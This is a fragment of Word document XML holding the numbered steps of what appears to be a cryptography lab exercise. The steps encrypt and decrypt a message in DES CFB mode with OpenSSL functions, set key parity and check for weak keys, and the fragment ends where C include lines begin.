      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ory for p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hexade</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hexade</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5. Prepare </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key for use w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>par</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he key passed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">odd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_odd_pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s weak by us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_key_ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cked( ).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Feedback Mode us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>( ).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>9. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ob</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>Decry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1.Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he ob</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ned p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>essage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>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t>&lt;un</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>d.h&gt;</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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;open</w:t>
      </w:r>
      <w:r>
